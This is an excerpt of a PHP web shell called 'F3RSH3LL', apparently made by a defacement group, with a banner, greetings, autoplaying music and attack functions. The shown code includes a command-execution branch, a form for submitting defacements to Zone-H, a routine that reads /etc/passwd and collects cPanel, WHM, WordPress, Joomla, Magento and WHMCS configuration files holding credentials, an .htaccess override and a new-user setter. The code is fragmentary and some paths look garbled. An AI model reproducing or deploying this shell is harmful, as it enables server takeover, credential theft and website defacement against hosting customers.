...
<body bgcolor="black">
	<center><img src="https://g.top4top.io/p_1637blvua0.jpeg" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ Welcome To</font><font color="white" face="Patrick Hand"> F3RSH3LL ]=-</font><br>
</center>
...
<title>WELCOME TO F3RSH3LL</title>
<meta property="og:image" src="https://l.top4top.io/p_1637hljos0.jpeg"/>
<style>
body{
...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://b.top4top.io/p_1637irv2w0.jpeg);
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">xXx  WELCOME TO F3RSH3LL xXx</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">“ Enjoy Deface Bro XixiXi ”</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Cukimay Cyber Team - Indonesian Cyber Jawa - Dark People Team - Return Of Squad Cyber - And All My Friend</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.mp3" type="audio/mpeg"></audio></center>
...
+ Coded By   <td>: <font color='lime'> F3RGUSO | Silent Because Of Yourself<tr><td><font color='white'>
+ Message  <td>: <font color='lime'>- SILENT IS GOLD -</font></tr></td><br>
</table>";
...
if($_GET['do'] == 'cmd') {
	...
	</center>"; } else { echo "<center>Ini UserName nya Salin Dulu Terus ewek:v<br><br>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./SimonXporn66Xploit'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./SimonXporn66Xploit</textarea><br>
...
echo "</div>";
   ...
   $idx = mkdir("./SimonXporn66Xploit_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("./SimonXporn66Xploit_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
   ...
   $user_config_dir = "/home/$user_./SimonXporn66Xploit/public_html/";
   if(is_readable($user_config_dir)) {
   $grab_config = array(
   "/home/$user_./SimonXporn66Xploit/.my.cnf" => "cpanel",
   "/home/$user_./SimonXporn66Xploit/.accesshash" => "WHM-accesshash",
   "/home/$user_./SimonXporn66Xploit/public_html/vdo_config.php" => "Voodoo",
   "/home/$user_./SimonXporn66Xploit/public_html/bw-configs/config.ini" => "BosWeb",
   "/home/$user_./SimonXporn66Xploit/public_html/config/koneksi.php" => "Lokomedia",
   "/home/$user_./SimonXporn66Xploit/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
   "/home/$user_./SimonXporn66Xploit/public_html/clientarea/configuration.php" => "WHMCS",
   "/home/$user_./SimonXporn66Xploit/public_html/whm/configuration.php" => "WHMCS",
   "/home/$user_./SimonXporn66Xploit/public_html/whmcs/configuration.php" => "WHMCS",
   "/home/$user_./SimonXporn66Xploit/public_html/forum/config.php" => "phpBB",
   "/home/$user_./SimonXporn66Xploit/public_html/sites/default/settings.php" => "Drupal",
   "/home/$user_./SimonXporn66Xploit/public_html/config/settings.inc.php" => "PrestaShop",
   "/home/$user_./SimonXporn66Xploit/public_html/app/etc/local.xml" => "Magento",
   "/home/$user_./SimonXporn66Xploit/public_html/joomla/configuration.php" => "Joomla",
   "/home/$user_./SimonXporn66Xploit/public_html/configuration.php" => "Joomla",
   "/home/$user_./SimonXporn66Xploit/public_html/wp/wp-config.php" => "WordPress",
   "/home/$user_./SimonXporn66Xploit/public_html/wordpress/wp-config.php" => "WordPress",
   "/home/$user_./SimonXporn66Xploit/public_html/wp-config.php" => "WordPress",
   "/home/$user_./SimonXporn66Xploit/public_html/admin/config.php" => "OpenCart",
   "/home/$user_./SimonXporn66Xploit/public_html/slconfig.php" => "Sitelok",
   "/home/$user_./SimonXporn66Xploit/public_html/application/config/database.php" => "Ellislab");
 ...
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='./SimonXporn66Xploit' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='./SimonXporn66Xploit' placeholder='pass_baru'><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <td>
   <center>
   <h2 style='color'blue'>PRIVATE SHELL F3RGUSO</font></h2>
   <p style='color: white;'>GreetZ:</p>
   <font color="cyan">[</font>
   <marquee behavior="alternate" scrollamount="10" style="width: 40%;">Cukimay Cyber Team - Indonesian Cyber Jawa - Dark People Team - All My Friends</marquee>
   <font color="cyan">]</font>
   <p>F3RGUSO GANS</p>
   </center>
   </td>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2020 " F3RGUSO " |  Always30</center>
</body>
</html>';
function perms($file){
